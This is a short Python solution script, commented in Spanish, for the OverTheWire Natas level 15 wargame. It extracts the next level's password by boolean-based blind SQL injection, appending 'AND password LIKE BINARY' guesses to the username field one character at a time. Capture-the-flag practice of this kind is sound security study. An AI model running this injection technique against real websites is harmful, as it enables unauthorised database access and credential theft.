# Para leer los passwords
import sys
sys.path.insert(0, '../')
import utils
# Para este nivel
import requests
import string

# Generamos un diccionario con las claves de los niveles.
# Tiene que estar el password de este nivel definido en natas_passwords
# Ver como definir con el archivo de ejemplo natas_passwords_sample
passwords = utils.read_passwords('../natas_passwords')
level = 'natas15'

# Generamos una lista de caracteres alfanumericos con mayusculas y minusculas
chars = list(string.ascii_letters + string.digits)

# Nuestro payload va a tener dos campos, username y debug
payload = {'username': '', 'debug': ''}
# La base de la consulta no va a cambiar, solo vamos a ir agregando el password a esta base
basePayload = 'natas16" AND password LIKE BINARY "'
password = ''
foundPass = False

# Vamos agregando a password caracter por caracter.
# Si la respuesta es verdadera, dejamos ese caracter en password,
# sino lo eliminamos. Si ninguno funciona, terminamos.
while not foundPass:
    for i in range(0, len(chars)):
        password += chars[i]
        print('Current guess: {}'.format(password), end="\r", flush=True)
        payload['username'] = basePayload + password + '%" #'
        r = requests.get('http://natas15.natas.labs.overthewire.org', params=payload, auth=requests.auth.HTTPBasicAuth(level, passwords[level]))
        if 'This user exists' in r.text:
            break
        else:
            password = password[:len(password)-1]
    else:
        # Si no hice break, recorri todos los caracteres y nada funciono. Entonces termine.
        foundPass = True

# Imprimimos el password encontrado
print('Found password: {}'.format(password))
        